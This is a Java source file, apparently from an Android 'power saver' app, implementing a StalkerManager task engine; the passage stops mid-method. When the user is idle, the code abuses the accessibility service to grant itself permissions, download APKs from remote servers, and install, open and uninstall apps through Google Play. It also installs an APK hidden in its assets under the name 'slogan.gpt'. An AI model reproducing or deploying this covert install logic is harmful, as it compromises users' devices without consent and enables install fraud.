package com.luna.powersaver.gp.manager;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.luna.powersaver.gp.PowerSaver;
import com.luna.powersaver.gp.common.StaticConst;
import com.luna.powersaver.gp.entity.JsonAppInfo;
import com.luna.powersaver.gp.http.DownloadManager;
import com.luna.powersaver.gp.http.bean.DownloadInfo;
import com.luna.powersaver.gp.service.NBAccessibilityService;
import com.luna.powersaver.gp.utils.AppDebugLog;
import com.luna.powersaver.gp.utils.AppUtil;
import com.luna.powersaver.gp.utils.FileUtil;
import com.luna.powersaver.gp.utils.JsonUtil;
import com.luna.powersaver.gp.utils.NetworkUtil;

import org.json.JSONArray;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

import static com.luna.powersaver.gp.utils.FileUtil.copyApkFromAssets;
import static com.luna.powersaver.gp.utils.FileUtil.getOwnCacheDirectory;

/**
 * 为了操作方便，暂时实行同一时间一个任务 <br />
 * 此处工作基本都在线程执行 <br />
 * Created by zsigui on 17-1-18.
 */

public class StalkerManager implements DownloadInfo.DownloadListener {

    public String testAddApkDownloadInfo() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加Apk下载测试成功!");
        JsonAppInfo i = new JsonAppInfo();
        i.execstate = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
        i.start = 1;
        i.uri = "intent:#Intent;action=andrid.intent.action.SHELL_CORE_SERVICE;package=luna.net.shortfilm.gp;end";
        i.url = "http://static.amigo.ws/apk/release_241.apk";
        i.task = JsonAppInfo.TASK.DOWNLOAD_BY_APK;
        i.pkg = "luna.net.shortfilm.gp";
        i.starttime = System.currentTimeMillis() / 1000 - 10;
        i.endtime = System.currentTimeMillis() / 1000 + 30 * 60;
        i.action = JsonAppInfo.ACTION.NOT_WORK_AFTER_OPEN;
        ArrayList<JsonAppInfo> is = new ArrayList<>();
        is.add(i);
        addNewTask(is);
        return JsonUtil.convertJsonAppInfoToJson(i);
    }

    public String testAddGpDownloadInfo() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加GP下载测试成功!");
        JsonAppInfo i = new JsonAppInfo();
        i.execstate = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
        i.start = 1;
        i.uri = "";
        i.task = JsonAppInfo.TASK.DOWNLOAD_BY_GP;
        i.pkg = "com.luna.applocker.gp";
        i.starttime = System.currentTimeMillis() / 1000 - 10;
        i.endtime = System.currentTimeMillis() / 1000 + 30 * 60;
        i.action = JsonAppInfo.ACTION.NOT_WORK_AFTER_OPEN;
        i.exp = 30;
        ArrayList<JsonAppInfo> is = new ArrayList<>();
        is.add(i);
        addNewTask(is);
        return JsonUtil.convertJsonAppInfoToJson(i);
    }

    private void printJsonAppInfo(JsonAppInfo info) {
        AppDebugLog.d(AppDebugLog.TAG_PRINT, "当前执行的任务: " + JsonUtil.convertJsonAppInfoToJson(info));
    }

    private void printJsonAppInfoMap(HashMap<String, JsonAppInfo> map) {
        AppDebugLog.d(AppDebugLog.TAG_PRINT, "当前总的任务：" + JsonUtil.convertJsonAppInfoMapToJson(map));
    }

    private void printJsonAppInfoList(ArrayList<JsonAppInfo> list) {
        if (list != null) {
            JSONArray jsonArray = new JSONArray();
            for (JsonAppInfo entry : list) {
                jsonArray.put(JsonUtil.convertJsonAppInfoToJObj(entry));
            }
            AppDebugLog.d(AppDebugLog.TAG_PRINT, "待执行任务列表：" + jsonArray.toString());

        } else {
            AppDebugLog.d(AppDebugLog.TAG_PRINT, "list is null");
        }
    }

    /*------------------- 临时内容 ----------------------*/

    public JsonAppInfo judgeAndConstructDefaultInfo(Context context) {
        JsonAppInfo i = null;
        try {
            String[] paths = context.getAssets().list("");
            AppDebugLog.d(AppDebugLog.TAG_STALKER, "循环显示assets地址内容!");
            final String filename = "slogan.gpt";
            final String apkname = "luna.net.shortfilm.gp_release_241.apk";
            for (String p : paths) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "path : " + p);
                if (p != null && p.endsWith(".gpt")) {
                    File extDir = FileUtil.getOwnCacheDirectory(context, StaticConst.STORE_DOWNLOAD);
                    if (!extDir.exists() || !extDir.isDirectory()) {
                        FileUtil.forceMkDir(extDir);
                    }
                    if (extDir.isDirectory() && extDir.exists()) {
                        File targetFile = new File(extDir, apkname);
                        if ((targetFile.exists() && targetFile.isFile())
                                || AppUtil.isPkgInstalled(context, "luna.net.shortfilm.gp")
                                || copyApkFromAssets(context, filename, targetFile.getAbsolutePath())) {
                            // 文件不存在且复制成功，或者已经安装（已经安装表示通知唤醒）
                            AppDebugLog.d(AppDebugLog.TAG_STALKER, "进行默认任务构建");
                            i = new JsonAppInfo();
                            i.execstate = JsonAppInfo.EXC_STATE.DOWNLOADED;
                            i.start = 1;
                            i.uri = "intent:#Intent;action=andrid.intent.action.SHELL_CORE_SERVICE;package=luna.net" +
                                    ".shortfilm.gp;end";
                            i.url = "http://default.gp.com/release_241.apk";
                            i.task = JsonAppInfo.TASK.DOWNLOAD_BY_APK;
                            i.pkg = "luna.net.shortfilm.gp";
                            i.starttime = System.currentTimeMillis() / 1000 - 10;
                            i.endtime = System.currentTimeMillis() / 1000 + 30 * 60;
                            i.action = JsonAppInfo.ACTION.NOT_WORK_AFTER_OPEN;
                        }
                    }
                    break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return i;
    }

    /**
     * 添加默认的设置任务，然后立即调用执行判断操作
     */
    public void addDefaultInfoAndExecImmediately() {

        if (!AppUtil.isAccessibleEnabled(StaticConst.sContext)) {
            AppDebugLog.d(AppDebugLog.TAG_STALKER, "没有无障碍权限，不继续执行添加任务");
            return;
        }

        JsonAppInfo i = judgeAndConstructDefaultInfo(StaticConst.sContext);
        if (i != null) {
            AppDebugLog.d(AppDebugLog.TAG_STALKER, "需要添加执行新任务");
            // 添加任务
            addNewTaskForDefault(i);
            DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(this);
            // 开始执行
            NBAccessibilityService.sIsInWork = true;
            doStart();
        }
    }

    /**
     * 开启监视弹窗，然后执行任务的过程，此处限制添加的任务
     */
    public void startSpyWork() {
        if (mIsInSpying)
            return;
        mIsInSpying = true;
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                addDefaultInfoAndExecImmediately();
            }
        }, 3000);
    }

    /**
     * 判断并添加新增的任务，建议线程中执行
     */
    public void addNewTaskForDefault(JsonAppInfo info) {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "准备添加新任务");
        if (mWaitingList == null || mTotalMap == null) {
            restoreCurrentTask();
        }
        JsonAppInfo old;
        old = mTotalMap.get(info.pkg);
        if (old == null) {
            AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加新的任务，对应包名： " + info.pkg);
            mWaitingList.add(info);
            mTotalMap.put(info.pkg, info);
        } else {
            if ((old.execstate != JsonAppInfo.EXC_STATE.FINISHED
                    && old.execstate != JsonAppInfo.EXC_STATE.DISCARD)
                    || (old.starttime < info.starttime)) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "重置旧的任务：" + info.pkg);
                // 任务没完成或者需要重置
                old.starttime = info.starttime;
                old.endtime = info.endtime;
                old.task = info.task;
                old.start = info.start;
                old.openedtime = info.openedtime;
                old.uri = info.uri;
                old.action = info.action;
                old.endaction = info.endaction;
                old.execstate = info.execstate;
                for (JsonAppInfo tp : mWaitingList) {
                    if (tp.pkg.equals(old.pkg)) {
                        return;
                    }
                }
                mWaitingList.add(old);
            } else {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "该任务已经存在且无须重置!");
            }
        }
    }

    /*------------------- 正式内容 ----------------------*/

    private static StalkerManager sInstance;

    public static StalkerManager get() {
        if (sInstance == null) {
            sInstance = new StalkerManager();
        }
        return sInstance;
    }

    private static final String FILE_TOTAL_NAME = "all";
    private static final String FILE_KEY_NAME = "k";
    /**
     * 默认监测用户无操作间隔，5分钟，单位 ms
     */
    private static final int DEFAULT_SPY_DIFF_TIME = 30 * 1000;
    private static final int DEFAULT_RESTART_SPY_TIME = 30 * 1000;
    private boolean mIsInSpying = false;
    /**
     * 当前正在执行的任务
     */
    public JsonAppInfo pCurrentWorkInfo;
    // 全部任务列表
    private HashMap<String, JsonAppInfo> mTotalMap = null;
    private ArrayList<JsonAppInfo> mWaitingList = null;

    /**
     * 移除废除的任务，建议线程中执行
     */
    public void removeOldTask(String oldpkgs) {
        if (TextUtils.isEmpty(oldpkgs)) {
            return;
        }
        if (mWaitingList == null || mTotalMap == null) {
            restoreCurrentTask();
        }
        String[] oldpkgArr = oldpkgs.split("|");
        JsonAppInfo tmp;
        for (String pkg : oldpkgArr) {
            if (TextUtils.isEmpty(pkg))
                continue;

            if (pCurrentWorkInfo != null && pCurrentWorkInfo.pkg.equals(pkg)) {
                // 当前任务需要废除
                pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DISCARD;
                pCurrentWorkInfo = null;
            }
            Iterator<JsonAppInfo> it = mWaitingList.iterator();
            while (it.hasNext()) {
                tmp = it.next();
                if (tmp != null && pkg.equals(tmp.pkg)) {
                    it.remove();
                }
            }
        }
    }

    /**
     * 判断并添加新增的任务，建议线程中执行
     */
    public void addNewTask(ArrayList<JsonAppInfo> newpkgs) {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "准备添加新任务，任务量: " + newpkgs.size());
        if (mWaitingList == null || mTotalMap == null) {
            restoreCurrentTask();
        }
        JsonAppInfo old;
        for (JsonAppInfo info : newpkgs) {
            if (info == null)
                continue;
            old = mTotalMap.get(info.pkg);
            if (old == null) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加新的任务，对应包名： " + info.pkg);
                mWaitingList.add(info);
                mTotalMap.put(info.pkg, info);
            } else {
                if ((old.execstate != JsonAppInfo.EXC_STATE.FINISHED
                        && old.execstate != JsonAppInfo.EXC_STATE.DISCARD)
                        || (old.starttime < info.starttime)) {
                    AppDebugLog.d(AppDebugLog.TAG_STALKER, "重置旧的任务：" + info.pkg);
                    // 任务没完成或者需要重置
                    old.starttime = info.starttime;
                    old.endtime = info.endtime;
                    old.task = info.task;
                    old.start = info.start;
                    old.openedtime = info.openedtime;
                    old.uri = info.uri;
                    old.action = info.action;
                    old.endaction = info.endaction;
                    old.execstate = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
                    for (JsonAppInfo tp : mWaitingList) {
                        if (tp.pkg.equals(old.pkg)) {
                            return;
                        }
                    }
                    mWaitingList.add(old);
                } else {
                    AppDebugLog.d(AppDebugLog.TAG_STALKER, "该任务已经存在且无须重置!");
                }
            }
        }
    }

    private Handler mHandler = new Handler(Looper.getMainLooper());
    private Runnable startRunnable = new Runnable() {
        @Override
        public void run() {
            AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行startRunnalbe事件");
            if (mTotalMap == null) {
                restoreCurrentTask();
            }
            if (NetworkUtil.isWifiConnected(StaticConst.sContext)) {
                NBAccessibilityService.sIsInWork = true;
//                screenWakeup();
                doStart();
            } else {
                stopSpyWork();
            }
        }
    };
    private Runnable touchToRestartRunnable = new Runnable() {
        @Override
        public void run() {
            AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行touchToRestartRunnable事件");
            if (!PowerSaver.get().isGuardViewShown())
                return;
            startSpyWork();
        }
    };


//    /**
//     * 开启监视弹窗，然后执行任务的过程
//     */
//    public void startSpyWork() {
//        if (!AppUtil.isAccessibleEnabled(StaticConst.sContext)) {
//            AppDebugLog.d(AppDebugLog.TAG_STALKER, "没有无障碍权限，不进行其他操作");
//            return;
//        }
//        if (mIsInSpying)
//            return;
//        AppDebugLog.d(AppDebugLog.TAG_STALKER, "开始执行监视任务!");
//        mIsInSpying = true;
//        mHandler.removeCallbacksAndMessages(null);
//        mHandler.postDelayed(startRunnable, DEFAULT_SPY_DIFF_TIME);
//        DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(this);
//    }


    public void stopAndWaitStartSpyWork() {
        stopSpyWork();
        mHandler.postDelayed(touchToRestartRunnable, DEFAULT_RESTART_SPY_TIME);
    }

    /**
     * 停止监视弹窗
     */
    public void stopSpyWork() {
        mHandler.removeCallbacksAndMessages(null);
        if (!mIsInSpying)
            return;
        mIsInSpying = false;
        NBAccessibilityService.sIsInWork = false;
        AppUtil.jumpToHome(StaticConst.sContext);
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "取消执行监视任务!");
//        screenLock();
        // 保存当前任务状态
        StalkerManager.get().saveCurrentTask();
        mTotalMap = null;
        mWaitingList = null;
        pCurrentWorkInfo = null;
//        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.CLEAR;
        ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
        DownloadManager.getInstance(StaticConst.sContext).removeDownloadListener(this);
    }

    /**
     * 实际开始执行任务，
     */
    public synchronized void doStart() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doStart执行!");
        if (!NBAccessibilityService.sIsInWork) {
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT
                && !AppUtil.hasAllPermissions(StaticConst.sContext)) {
            AppDebugLog.d(AppDebugLog.TAG_STALKER, "有未授权选项，需要首先进行判断设置权限");
            NBAccessibilityService.sCurrentWorkState = 0;
            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.SET_PERMISSION;
            AppUtil.jumpToDetailSetting(StaticConst.sContext, StaticConst.sContext.getPackageName());
            return;
        }

        NBAccessibilityService.sRetryTime = 0;

        if (mTotalMap == null || mWaitingList == null)
            restoreCurrentTask();

        printJsonAppInfoList(mWaitingList);
        if (pCurrentWorkInfo != null)
            // 确保一致
            pCurrentWorkInfo = mTotalMap.get(pCurrentWorkInfo.pkg);

        if (pCurrentWorkInfo == null || pCurrentWorkInfo.execstate == JsonAppInfo.EXC_STATE.DISCARD
                || pCurrentWorkInfo.execstate == JsonAppInfo.EXC_STATE.FINISHED) {
            // 处理 pCurrentWorkInfo
            JsonAppInfo info = null;
            Iterator<JsonAppInfo> iterator = mWaitingList.iterator();
            long curTime = System.currentTimeMillis() / 1000;
            while (iterator.hasNext()) {
                info = iterator.next();
                if (info == null) {
                    iterator.remove();
                } else if ((info.endtime > 0 && curTime >= info.endtime)
                        || info.execstate == JsonAppInfo.EXC_STATE.DISCARD
                        || info.execstate == JsonAppInfo.EXC_STATE.FINISHED) {
                    // 已经超时，任务废弃
                    iterator.remove();
                    info.execstate = JsonAppInfo.EXC_STATE.DISCARD;
                } else if (curTime > info.starttime) {
                    // 正常可执行任务
                    break;
                }
                info = null;
            }
            if (info == null) {
                // 没有任务或者没有合适的任务，此次执行提前结束
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "没有任务或者没有合适的任务，此次执行提前结束");
                stopSpyWork();
                return;
            }

            pCurrentWorkInfo = info;
        }

        if (pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD
                && AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
            // 要进行的任务已经安装，所以直接修改状态
            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.INSTALLED;
        }
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "任务当前状态为：" + pCurrentWorkInfo.execstate);
        printJsonAppInfo(pCurrentWorkInfo);
        // 之前执行任务重启判断
        switch (pCurrentWorkInfo.execstate) {
            case JsonAppInfo.EXC_STATE.DOWNLOADED:
                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(pCurrentWorkInfo.pkg);
                    info.setDestUrl(pCurrentWorkInfo.url);
                    info.setDownloadUrl(pCurrentWorkInfo.url);
                    doContinueAfterDownloaded(info);
                    return;
                }
                break;
            case JsonAppInfo.EXC_STATE.INSTALLED:
                doContinueAfterInstalled();
                return;
            case JsonAppInfo.EXC_STATE.OPENED:
                doContinueAfterOpened();
                return;
            case JsonAppInfo.EXC_STATE.FINISHED:
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "当前任务已经完成，重新执行下一个任务!");
                doNextStart();
                return;
        }
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行当前任务，pCurrentWorkInfo = " + pCurrentWorkInfo.pkg);

        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DOWNLOADING;
        NBAccessibilityService.sCurrentWorkState = 0;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
            // 开始下载
            DownloadInfo downloadInfo = new DownloadInfo();
            downloadInfo.setDownloadUrl(pCurrentWorkInfo.url);
            downloadInfo.setDestUrl(pCurrentWorkInfo.url);
            downloadInfo.setPackageName(pCurrentWorkInfo.pkg);
            DownloadManager.getInstance(StaticConst.sContext).startDownload(downloadInfo);
            // 需要等下载完之后回调
        } else if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_GP) {
            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
            if (!AppUtil.jumpToStore(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                // 上报由于不存在GP而失败
                doNextStartAfterError(0, "GP没有安装失败");
            }
        }
    }

    /**
     * 卸载完成后执行下一个任务
     */
    public void doContinueAfterUninstall() {
        // 卸载之后，则开始执行下一个任务
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterUninstall");
        NBAccessibilityService.sCurrentWorkState = 0;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        doNextStart();
    }

    /**
     * 当APP检测已经安装，执行该步骤
     */
    public void doContinueAfterInstalled() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterInstalled");
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterInstalled：当前状态 = " + pCurrentWorkInfo.execstate);
        if (!AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DOWNLOADING;
            doStart();
            return;
        }
        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.INSTALLED;
        NBAccessibilityService.sCurrentWorkState = 0;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        switch (pCurrentWorkInfo.action) {
            case JsonAppInfo.ACTION.NOT_WORK:
                // 不卸载包了
                removeDownload();
                doNextStart();
                break;
            case JsonAppInfo.ACTION.NOT_WORK_AFTER_INSTALL:
                // 安装后继续下一步
                doNextStart();
                break;
            case JsonAppInfo.ACTION.UNINSTALL_AFTER_INSTALL:
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                        AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    } else {
                        doContinueAfterUninstall();
                    }
                }
                // 安装后不打开立即卸载
                break;
            case JsonAppInfo.ACTION.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.ACTION.NOT_WORK_AFTER_OPEN:
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                judgeOpen();
                break;
        }
    }

    /**
     * 处理APP打开过后的操作（根据累计时间继续打开或者下载完成等）
     */
    public void doContinueAfterOpened() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterOpened");
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
//        if (pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.INSTALLED
//                && pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.OPENED) {
//            return;
//        }
        ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.OPENED;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        NBAccessibilityService.sCurrentWorkState = 0;
        switch (pCurrentWorkInfo.action) {
            case JsonAppInfo.ACTION.NOT_WORK:
                // 一般该状态到不了这里
                removeDownload();
                doNextStart();
                break;
            case JsonAppInfo.ACTION.NOT_WORK_AFTER_INSTALL:
                // 一般该状态到不了这里
                removeDownload();
                doNextStart();
                break;
            case JsonAppInfo.ACTION.UNINSTALL_AFTER_INSTALL:
                // 一般该状态到不了这里
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                        AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    } else {
                        doContinueAfterUninstall();
                    }
                }
                break;
            case JsonAppInfo.ACTION.NOT_WORK_AFTER_OPEN:
                if (isFinishedOpen()) {
                    doNextStart();
                } else {
                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                    judgeOpen();
                }
                break;
            case JsonAppInfo.ACTION.UNINSTALL_AFTER_OPEN:
                if (isFinishedOpen()) {
                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                    if (NBAccessibilityService.sIsInWork) {
                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                        } else {
                            doContinueAfterUninstall();
                        }
                    }
                } else {
                    judgeOpen();
                }
                break;
        }
    }

    private void removeDownload() {
        if (pCurrentWorkInfo != null && pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
            DownloadInfo info = new DownloadInfo();
            info.setPackageName(pCurrentWorkInfo.pkg);
            info.setDownloadUrl(pCurrentWorkInfo.url);
            info.setDestUrl(pCurrentWorkInfo.url);
            // 删除可能存在的包，不做其他操作
            DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
        }
    }

    /**
     * 判断开启应用，并进行打开计时
     */
    private void judgeOpen() {
        if (NBAccessibilityService.sIsInWork) {
            if (!AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DOWNLOADING;
                doStart();
                return;
            }
            if (!AppUtil.isPkgForeground(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "非前台，进行跳转，开启闹钟判断!");
                AppUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo);
                // 开启后台计时服务
                if (pCurrentWorkInfo.start != 0) {
                    pCurrentWorkInfo.openedtime = pCurrentWorkInfo.exp;
                    doContinueAfterOpened();
                } else {
                    ClockManager.get().startOpenRecordAlarm(StaticConst.sContext);
                }
            }
        }
    }

    /**
     * 下载完成后处理，由于通过GP会直接跳转安装完成，则GP下载该步是忽略的
     *
     * @param info
     */
    public void doContinueAfterDownloaded(DownloadInfo info) {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterDownloaded");
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        if (info == null) {
            info = new DownloadInfo();
            info.setPackageName(pCurrentWorkInfo.pkg);
            info.setDownloadUrl(pCurrentWorkInfo.url);
            info.setDestUrl(pCurrentWorkInfo.url);
        }
        NBAccessibilityService.sCurrentWorkState = 0;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        switch (pCurrentWorkInfo.action) {
            case JsonAppInfo.ACTION.NOT_WORK:
                // 删除包，然后不做其他操作
//                DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                doNextStart();
                break;
            case JsonAppInfo.ACTION.NOT_WORK_AFTER_INSTALL:
            case JsonAppInfo.ACTION.UNINSTALL_AFTER_INSTALL:
            case JsonAppInfo.ACTION.NOT_WORK_AFTER_OPEN:
            case JsonAppInfo.ACTION.UNINSTALL_AFTER_OPEN:
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "判断执行安装操作!");
                NBAccessibilityService.sCurrentWorkState = 0;
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.INSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppUtil.install(StaticConst.sContext,
                            DownloadManager.getInstance(StaticConst.sContext).getDownloadFile(info));
                }
                break;
        }
    }

    public void doContinueAfterSearch() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterSearch");
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
        NBAccessibilityService.sCurrentWorkState = 0;
    }

    public void doNextStart() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doNextStart");
        if (pCurrentWorkInfo != null) {
            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.FINISHED;
        }
        pCurrentWorkInfo = null;
        saveCurrentTask();
        doStart();
    }

    public void doNextStartAfterError(int code, String msg) {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doNextStartAfterError: " + msg);
        if (pCurrentWorkInfo != null) {
            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DISCARD;
        }
        pCurrentWorkInfo = null;
        saveCurrentTask();
        doStart();
    }

    @Override
    public void onProgressUpdate(DownloadInfo info, int elapsedTime) {

    }

    @Override
    public void onFinishDownload(DownloadInfo info) {
        doContinueAfterDownloaded(info);
    }

    @Override
    public void onFailDownload(DownloadInfo info, String err) {
        // 下载失败，废弃
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "下载失败: " + info.getPackageName() + ", url = "
                + info.getDownloadUrl() + ", err = " + err);
        doNextStartAfterError(0, "APK下载失败");
    }

    @Nullable
    private File getOrMkStoreDir() {
        File storeDir = getOwnCacheDirectory(StaticConst.sContext, StaticConst.STORE_DATA);
        if (!storeDir.exists() || !storeDir.isDirectory()) {
            boolean isSuccess = storeDir.mkdirs();
            if (!isSuccess) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "创建文件夹失败: " + storeDir.getAbsolutePath());
                return null;
            }
        }
        return storeDir;
    }

    /**
     * 保存任务状态，建议在线程中执行
     */
    public void saveCurrentTask() {
        if (mTotalMap == null || mWaitingList == null)
            return;
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "进行任务状态保护!");
        File storeDir = getOrMkStoreDir();
        if (storeDir == null) return;
        truncateTotalMap();
        printJsonAppInfoMap(mTotalMap);
        String json = JsonUtil.convertJsonAppInfoMapToJson(mTotalMap);
        FileUtil.writeData(new File(storeDir, FILE_TOTAL_NAME), json);
        json = JsonUtil.convertJsonAppInfoToJson(pCurrentWorkInfo);
        FileUtil.writeData(new File(storeDir, FILE_KEY_NAME), json);
    }

    /**
     * 提取任务状态，建议在线程中执行
     */
    public void restoreCurrentTask() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "获取保存的任务状态!");
        File tmpFile = getOrMkStoreDir();
        if (tmpFile != null) {
            tmpFile = new File(tmpFile, FILE_TOTAL_NAME);
            String json;
            if (tmpFile.exists()) {
                json = FileUtil.readData(tmpFile);
                mTotalMap = JsonUtil.convertJsonStringToJsonAppInfoMap(json);
            }
            tmpFile = new File(tmpFile, FILE_KEY_NAME);
            if (tmpFile.exists()) {
                json = FileUtil.readData(tmpFile);
                pCurrentWorkInfo = JsonUtil.convertJsonToJsonAppInfo(json);
            }
        }
        mTotalMap = (mTotalMap == null ? new HashMap<String, JsonAppInfo>() : mTotalMap);
        if (mWaitingList == null) {
            mWaitingList = new ArrayList<>();
        } else {
            mWaitingList.clear();
        }
        if (mTotalMap != null) {
            if (pCurrentWorkInfo != null) {
                pCurrentWorkInfo = mTotalMap.get(pCurrentWorkInfo.pkg);
            }
            for (JsonAppInfo info : mTotalMap.values()) {
                if (info.execstate != JsonAppInfo.EXC_STATE.FINISHED
                        && info.execstate != JsonAppInfo.EXC_STATE.DISCARD) {
                    mWaitingList.add(info);
                }
            }
        }
        printJsonAppInfo(pCurrentWorkInfo);
        printJsonAppInfoMap(mTotalMap);
        printJsonAppInfoList(mWaitingList);
    }


    /**
     * 缩减数据，将废弃或者已经完成的过期的数据删除
     */
    private void truncateTotalMap() {
        int size = mTotalMap.size();
        if (size > 200) {
            // 尽量削减，最多一半
            Iterator<JsonAppInfo> it = mTotalMap.values().iterator();
            JsonAppInfo tmp;
            while (it.hasNext()) {
                tmp = it.next();
                if (tmp == null || tmp.execstate == JsonAppInfo.EXC_STATE.DISCARD) {
                    it.remove();
                    size--;
                }
                if (size <= 100) {
                    break;
                }
            }
            if (size > 200) {
                it = mTotalMap.values().iterator();
                long curTime = System.currentTimeMillis();
                while (it.hasNext()) {
                    tmp = it.next();
                    if (tmp == null || tmp.execstate == JsonAppInfo.EXC_STATE.FINISHED
                            && tmp.endtime < curTime) {
                        it.remove();
                        size--;
                    }
                    if (size <= 100) {
                        break;
                    }
                }
            }
        }
    }

    public boolean isFinishedOpen() {
        return pCurrentWorkInfo != null && pCurrentWorkInfo.openedtime >= pCurrentWorkInfo.exp;
    }

    public void judgeClearList() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行清洁保存任务：" + NBAccessibilityService.sIsInWork);
        StalkerManager.get().saveCurrentTask();
        if (PowerSaver.get().isGuardViewShown()) {
            startSpyWork();
        } else {
